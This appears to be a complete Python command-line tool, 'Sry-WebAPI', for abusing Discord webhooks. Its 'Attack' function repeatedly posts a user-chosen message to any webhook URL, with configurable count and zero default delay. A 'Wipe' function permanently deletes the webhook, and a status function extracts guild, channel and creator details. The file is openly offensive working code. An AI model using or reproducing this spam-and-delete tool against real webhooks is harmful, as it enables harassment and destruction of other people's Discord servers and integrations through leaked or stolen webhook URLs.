import os
import time
import requests
from rich.table import Table
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, IntPrompt, Confirm

try:
    # Windows
    import msvcrt
    def getch():
        return msvcrt.getch().decode()
except ImportError:
    import sys, tty, termios
    def getch():
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        try:
            tty.setraw(sys.stdin.fileno())
            ch = sys.stdin.read(1)
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
        return ch

console = Console()

def clear_console():
    """Clears the console screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def show_help():
    """Displays the help message."""
    clear_console()
    console.print(Panel.fit(
        "[bold medium_purple]Help Menu[/bold medium_purple]\n\n"
        "[bold]Status[/bold]: Checks the status and retrieves information about a webhook.\n\n"
        "[bold]Attack[/bold]: Starts a spam attack on a Discord Webhook URL.\n"
        "  - [italic]Webhook URL[/italic]: The URL of the webhook to be attacked.\n"
        "  - [italic]Message[/italic]: The message that will be sent repeatedly.\n"
        "  - [italic]Amount[/italic]: How many times the message should be sent.\n"
        "  - [italic]Delay[/italic]: The time in seconds between messages.\n\n"
        "[bold]Wipe[/bold]: Deletes a webhook (feature in development).\n\n"
        "[bold]Exit[/bold]: Exits the program.",
        title="Help", border_style="magenta"
    ))
    Prompt.ask("\n[green]Press Enter to return to the main menu...[/green]")

def attack_webhook():
    """Executes the spam attack on a webhook."""
    clear_console()
    console.print(Panel.fit("[bold red]Webhook Attack[/bold red]", title="Attack"))
 
    webhook_url = Prompt.ask("[cyan]Enter the Webhook URL[/cyan]")
    if not webhook_url.startswith("https://discord.com/api/webhooks/"):
        if not Confirm.ask(f"[yellow]The URL '{webhook_url[:30]}...' does not look like a valid Discord Webhook URL. Continue anyway?[/yellow]"):
            return

    message = Prompt.ask("[cyan]Enter the message to send[/cyan]", default="Webhook Test")
    count = IntPrompt.ask("[cyan]How many times should the message be sent?[/cyan]", default=10)
    delay = IntPrompt.ask("[cyan]Enter the delay in seconds[/cyan]", default=0)

    console.print(f"\n[yellow]Starting attack on {webhook_url}...[/yellow]")

    for i in range(count):
        payload = {"content": message}
        try:
            response = requests.post(webhook_url, json=payload)
            if response.status_code == 204:
                console.print(f"[green]Message {i+1}/{count} sent successfully.[/green]")
            else:
                console.print(f"[red]Error sending message {i+1}/{count}. Status code: {response.status_code}[/red]")
        except requests.exceptions.RequestException as e:
            console.print(f"[bold red]An error occurred: {e}[/bold red]")
            break
        time.sleep(delay)

    console.print("\n[bold green]Attack finished![/bold green]")
    Prompt.ask("\n[green]Press Enter to return to the main menu...[/green]")

def wipe_webhook():
    """Deletes a Discord webhook."""
    clear_console()
    console.print(Panel.fit("[bold red]Delete Webhook[/bold red]", title="Wipe", border_style="red"))
    webhook_url = Prompt.ask("[cyan]Enter the Webhook URL to delete[/cyan]")

    if not Confirm.ask(f"[bold yellow]Are you sure you want to permanently delete this webhook? This action cannot be undone.[/bold yellow]"):
        console.print("[yellow]Deletion cancelled.[/yellow]")
        time.sleep(2)
        return

    try:
        response = requests.delete(webhook_url)
        if response.status_code == 204:
            console.print(Panel.fit("[bold green]Webhook successfully deleted![/bold green]", title="Success", border_style="green"))
        elif response.status_code == 404:
            console.print(Panel.fit("[bold red]Invalid Webhook or already deleted.[/bold red]\nStatus Code: 404", title="Error", border_style="red"))
        else:
            console.print(Panel.fit(f"[bold yellow]Could not delete webhook.[/bold yellow]\nReceived status code: {response.status_code}\n{response.text}", title="Warning", border_style="yellow"))
    except requests.exceptions.MissingSchema:
        console.print(Panel.fit("[bold red]Invalid URL Format![/bold red]\nPlease enter a valid URL, e.g., 'https://...'", title="Error", border_style="red"))
    except requests.exceptions.RequestException as e:
        console.print(Panel.fit(f"[bold red]A network error occurred:[/bold red]\n{e}", title="Error", border_style="red"))

    Prompt.ask("\n[green]Press Enter to return to the main menu...[/green]")

def status_webhook():
    """Checks the status and info of a webhook."""
    clear_console()
    console.print(Panel.fit("[bold medium_purple]Webhook Status[/bold medium_purple]", title="Status", border_style="magenta"))
    webhook_url = Prompt.ask("[cyan]Enter the Webhook URL[/cyan]")

    try:
        response = requests.get(webhook_url)
        if response.status_code == 200:
            data = response.json()
            
            table = Table(title="Webhook Information", border_style="green", title_style="bold green")
            table.add_column("Attribute", style="cyan", no_wrap=True)
            table.add_column("Value", style="magenta")

            table.add_row("Name", data.get("name"))
            table.add_row("Webhook ID", data.get("id"))
            table.add_row("Token", "******" + data.get("token")[-4:] if data.get("token") else "N/A")
            table.add_row("Guild ID", data.get("guild_id"))
            table.add_row("Channel ID", data.get("channel_id"))
            table.add_row("Creator Name", data.get("user", {}).get("username", "N/A"))
            table.add_row("Avatar Hash", data.get("avatar", "N/A"))
            table.add_row("Application ID", data.get("application_id", "N/A"))
            
            console.print("\n[bold green]Webhook is valid![/bold green]")
            console.print(table)

        elif response.status_code == 404:
            console.print(Panel.fit(f"[bold red]Invalid Webhook![/bold red]\n\nThe webhook URL seems to be incorrect or the webhook has been deleted.\nStatus Code: {response.status_code}", title="Error", border_style="red"))
        else:
            console.print(Panel.fit(f"[bold yellow]Could not verify webhook.[/bold yellow]\n\nReceived status code: {response.status_code}\n{response.text}", title="Warning", border_style="yellow"))

    except requests.exceptions.MissingSchema:
        console.print(Panel.fit("[bold red]Invalid URL Format![/bold red]\nPlease enter a valid URL, e.g., 'https://...'", title="Error", border_style="red"))
    except requests.exceptions.RequestException as e:
        console.print(Panel.fit(f"[bold red]A network error occurred:[/bold red]\n{e}", title="Error", border_style="red"))

    Prompt.ask("\n[green]Press Enter to return to the main menu...[/green]")

def main_menu():
    """Displays the main menu and handles user input."""
    while True:
        clear_console()
        
        ascii_art = (
            "    (\\_/)\n"
            "    ( •_•)\n"
            "    / >🍙"
        )

        console.print(Panel.fit(
            f"{ascii_art}\n\n"
            "[bold medium_purple]Sry-WebAPI[/bold medium_purple]\n\n"
            "Select an option (press the corresponding number):\n"
            "[magenta]1[/magenta]) Status\n"
            "[magenta]2[/magenta]) Attack\n"
            "[magenta]3[/magenta]) Wipe\n"
            "[magenta]4[/magenta]) Help\n"
            "[magenta]5[/magenta]) Exit",
            title="Sry-WebAPI", border_style="magenta",
            subtitle="[bold purple]Waiting for input...[/bold purple]"
        ))

        choice = getch()

        if choice == "1":
            status_webhook()
        elif choice == "2":
            attack_webhook()
        elif choice == "3":
            wipe_webhook()
        elif choice == "4":
            show_help()
        elif choice == "5":
            console.print("[bold medium_purple]Goodbye![/bold medium_purple]")
            break

if __name__ == "__main__":
    main_menu()
